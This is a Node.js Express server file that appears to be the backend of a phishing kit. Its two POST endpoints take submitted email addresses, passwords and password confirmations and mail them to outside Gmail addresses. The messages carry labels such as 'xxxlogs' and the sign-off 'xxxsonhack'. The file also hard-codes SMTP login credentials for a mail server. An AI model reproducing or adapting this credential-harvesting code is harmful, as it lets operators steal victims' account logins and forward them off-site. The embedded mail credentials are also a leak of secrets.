const express = require("express");
const cors = require("cors");
const app = express();

app.use(cors());

const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
  res.send("api is run");
});

app.post("/sendmail", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.whitetransport.net",
      port: 465,
      auth: {
        user: "mustafa@whitetransport.net",
        pass: "uf4DBAatO5Ut",
      },
    });
    let info = await transporter.sendMail({
      from: '"You" <mustafa@whitetransport.net>',
      to: "Sales1.ppsl@gmail.com",
      subject: "Testing, testing, 123",
      html: `
    <div> 
      <h2>Here is your email!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});
app.post("/sendmail2", async (req, res) => {
  const { email, pass, pasers } = req.body;
  try {
    let transporter = nodemailer.createTransport({
      host: "mail.whitetransport.net",
      port: 465,
      auth: {
        user: "mustafa@whitetransport.net",
        pass: "uf4DBAatO5Ut",
      },
    });
    let info = await transporter.sendMail({
      from: '"You" <mustafa@whitetransport.net>',
      to: "ikrima.catirk@gmail.com",
      subject: "xxxlogs",
      html: `
    <div> 
      <h2>Here is your Log!</h2>
        <p>Email: ${email}</p>
        <p>Pass: ${pass}</p>
        <p>Confirm Pass: ${pasers}</p>
    
        <p>All the best, xxxsonhack</p>
         </div>
    `,
    });

    await transporter.sendMail(info);
    res.send("Email sent successfully");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error sending email");
  }
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, console.log(`server in on "5000"`));
